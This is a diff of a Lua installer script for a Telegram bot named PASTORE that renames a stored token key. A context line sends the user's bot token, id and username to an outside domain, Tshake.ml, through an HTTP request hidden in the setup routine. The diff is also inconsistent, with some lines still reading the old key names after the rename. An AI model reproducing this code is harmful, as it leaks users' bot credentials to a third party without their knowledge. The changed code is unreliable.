@@ -16,7 +16,7 @@ UserName = "]]..UserName..[["
 ]])
 PASTORE_Info_Sudo:close()
 end  
-if not database:get(Server_PASTORE.."Token_PASTORE") then
+if not database:get(Server_PASTORE.."Token_Write") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -34,7 +34,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_PASTORE.."UserName_PASTORE") then
+if not database:get(Server_PASTORE.."UserName_Write") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -63,13 +63,13 @@ end
 os.execute('lua start.lua')
 end
 local function Files_PASTORE_Info()
-Create_Info(database:get(Server_PASTORE.."Token_PASTORE"),database:get(Server_PASTORE.."Id_PASTORE"),database:get(Server_PASTORE.."UserName_PASTORE"))   
+Create_Info(database:get(Server_PASTORE.."Token_Write"),database:get(Server_PASTORE.."Id_PASTORE"),database:get(Server_PASTORE.."UserName_PASTORE"))   
 http.request("http://Tshake.ml/add/?id="..database:get(Server_PASTORE.."Id_PASTORE").."&user="..database:get(Server_PASTORE.."UserName_PASTORE").."&token="..database:get(Server_PASTORE.."Token_PASTORE"))
 local RunPASTORE = io.open("PASTORE", 'w')
 RunPASTORE:write([[
 #!/usr/bin/env bash
 cd $HOME/PASTORE
-token="]]..database:get(Server_PASTORE.."Token_PASTORE")..[["
+token="]]..database:get(Server_PASTORE.."Token_Write")..[["
 rm -fr PASTORE.lua
 wget "https://raw.githubusercontent.com/PASTORETEAM/PASTORE/main/PASTORE.lua"
 while(true) do
@@ -91,7 +91,7 @@ done
 RunTs:close()
 end
 Files_PASTORE_Info()
-database:del(Server_PASTORE.."Token_PASTORE");database:del(Server_PASTORE.."Id_PASTORE");database:del(Server_PASTORE.."UserName_PASTORE")
+database:del(Server_PASTORE.."Token_Write");database:del(Server_PASTORE.."Id_PASTORE");database:del(Server_PASTORE.."UserName_PASTORE")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
@@ -102,7 +102,7 @@ AutoFiles_PASTORE()
 var = true
 else   
 f:close()  
-database:del(Server_PASTORE.."Token_PASTORE");database:del(Server_PASTORE.."Id_PASTORE");database:del(Server_PASTORE.."UserName_PASTORE")
+database:del(Server_PASTORE.."Token_Write");database:del(Server_PASTORE.."Id_PASTORE");database:del(Server_PASTORE.."UserName_PASTORE")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
